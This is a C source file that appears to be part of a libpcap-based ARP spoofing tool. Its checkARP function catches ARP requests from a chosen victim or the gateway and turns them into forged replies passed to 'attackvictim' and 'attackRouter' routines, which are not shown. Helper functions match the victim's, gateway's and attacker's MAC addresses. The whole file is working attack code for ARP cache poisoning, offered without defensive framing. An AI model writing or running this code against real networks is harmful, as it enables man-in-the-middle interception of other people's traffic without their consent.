#include "myHeader.h"

int checkARP(pcap_t* handle, const u_char* packet, PLANINFO LanInfo)
{
	PARP_PACKET header;
	header = (PARP_PACKET)packet;
	u_short ether_type = ntohs(header->ethernet.etherType);
	if (ether_type == ARP)
	{
		u_short OpCode = ntohs(header->arp.Opcode);
		if (OpCode == REQUEST)
		{
			if (checkVictim(&(header->ethernet), LanInfo))
			{
				header->arp.Opcode = ntohs(REPLY);
				printf("attack victim\n");
				attackvictim(handle, header, LanInfo);
			}
			else if (checkGateWay(&(header->ethernet), LanInfo))
			{
				header->arp.Opcode = ntohs(REPLY);
				printf("attack router\n");
				attackRouter(handle, header, LanInfo);
			}
		}
		return 1;
	}
	return 0;
}
int checkVictim(PETHERNET_HEADER eh, PLANINFO LanInfo)
{
	int srcCheck, dstCheck;
	srcCheck = memcmp(eh->src_MAC, LanInfo->victimMAC, sizeof(u_char) * MACLEN);
	dstCheck = memcmp(eh->dst_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	return (!srcCheck) && (!dstCheck);
}
int checkGateWay(PETHERNET_HEADER eh, PLANINFO LanInfo)
{
	int srcCheck, dstCheck;
	srcCheck = memcmp(eh->src_MAC, LanInfo->gatewayMAC, sizeof(u_char) * MACLEN);
	dstCheck = memcmp(eh->dst_MAC, LanInfo->myMAC, sizeof(u_char) * MACLEN);
	return (!srcCheck) && (!dstCheck);
}